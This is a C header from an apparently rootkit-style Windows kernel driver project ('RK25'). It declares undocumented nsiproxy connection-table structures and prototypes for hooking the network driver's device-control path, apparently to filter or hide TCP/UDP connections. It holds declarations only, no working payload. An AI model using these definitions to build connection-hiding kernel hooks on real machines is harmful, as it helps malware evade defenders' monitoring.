#ifndef _RK25_HOOK_NET_H_
#define _RK25_HOOK_NET_H_

#include <ntddk.h>
#include <minwindef.h>
#include "../../../../common/rk25_def.h"
#include "../../../../common/rk25_dbg.h"
#include "../../../../common/list/rk25_list.h"
#include "../../../common/system/kernel/rk25_kernel.h"
#include "../../../common/system/switcher/rk25_switcher.h"

#define IOCTL_NSIPROXY_GET_CONNECTIONS 0x12001B

#define _NSI_PARAM_TYPE_TCP	3
#define _NSI_PARAM_TYPE_UDP	1

typedef enum _NSI_PARAM_TYPE {
	Udp = _NSI_PARAM_TYPE_UDP,
	Tcp = _NSI_PARAM_TYPE_TCP
} NSI_PARAM_TYPE;

typedef struct _NSI_STATUS_ENTRY {
	ULONG State;
	BYTE Reserved[8];
} NSI_STATUS_ENTRY, *PNSI_STATUS_ENTRY;

typedef struct _NSI_TCP_SUBENTRY {
	BYTE Reserved1[2];
	USHORT Port;
	ULONG IpAddress;
	BYTE IpAddress6[16];
	BYTE Reserved2[4];
} NSI_TCP_SUBENTRY, *PNSI_TCP_SUBENTRY;

typedef struct _NSI_TCP_ENTRY{
	NSI_TCP_SUBENTRY Local;
	NSI_TCP_SUBENTRY Remote;
} NSI_TCP_ENTRY, *PNSI_TCP_ENTRY;

typedef struct _NSI_UDP_ENTRY{
	BYTE Reserved1[2];
	USHORT Port;
	ULONG IpAddress;
	BYTE IpAddress6[16];
	BYTE Reserved2[4];
} NSI_UDP_ENTRY, *PNSI_UDP_ENTRY;

typedef struct _NSI_PROCESS_ENTRY{
	ULONG UdpProcessId;
	ULONG Reserved1;
	ULONG Reserved2;
	ULONG TcpProcessId;
	ULONG Reserved3;
	ULONG Reserved4;
	ULONG Reserved5;
	ULONG Reserved6;
} NSI_PROCESS_ENTRY, *PNSI_PROCESS_ENTRY;

typedef struct _NSI_PARAM {
	SIZE_T Reserved1;		// 8
	SIZE_T Reserved2;		// 8
	LPVOID ModuleId;		// 8
	NSI_PARAM_TYPE Type;	// 4
	ULONG Reserved3;		// 4
	ULONG Reserved4;		// 4
	LPVOID Entries;
	SIZE_T EntrySize;
	LPVOID Reserved5;
	SIZE_T Reserved6;
	PNSI_STATUS_ENTRY StatusEntries;
	SIZE_T Reserved7;
	PNSI_PROCESS_ENTRY ProcessEntries;
	SIZE_T ProcessEntrySize;
	SIZE_T Count;
} NSI_PARAM, *PNSI_PARAM;

typedef NTSTATUS(*ProtoOrigNetDeviceControl)(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp);
	
typedef VOID(*ProtoHookNetRoutine)(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PEPROCESS eproc);

typedef struct _RK25_OLD_NET_CONTEXT {
	PIO_COMPLETION_ROUTINE oldRoutine;
	PVOID oldContext;
	BOOLEAN invOnSuc;
	PEPROCESS proc;
} RK25_OLD_NET_CONTEXT, RK25_ONC, *PRK25_ONC;

typedef struct _RK25_DC_NET_DATA {
	ProtoHookNetRoutine routine;
	ULONG priority;
} RK25_DC_NET_DATA, RK25_DCND, *PRK25_DCND;

VOID RK25QueueNetDriverInit();
VOID RK25QueueNetDriverFree();
BOOLEAN RK25QueueNetDriverAdd(ProtoHookNetRoutine routine);
PRK25_DCND RK25QueueNetDriverGet(ProtoHookNetRoutine routine);
BOOLEAN RK25QueueNetDriverIsExists(ProtoHookNetRoutine routine);
VOID RK25QueueNetDriverDel(ProtoHookNetRoutine routine);

BOOLEAN RK25IsHookNetDriver();
NTSTATUS RK25NetDriverHook(ULONG attr);

#endif // !_RK25_HOOK_NET_H_
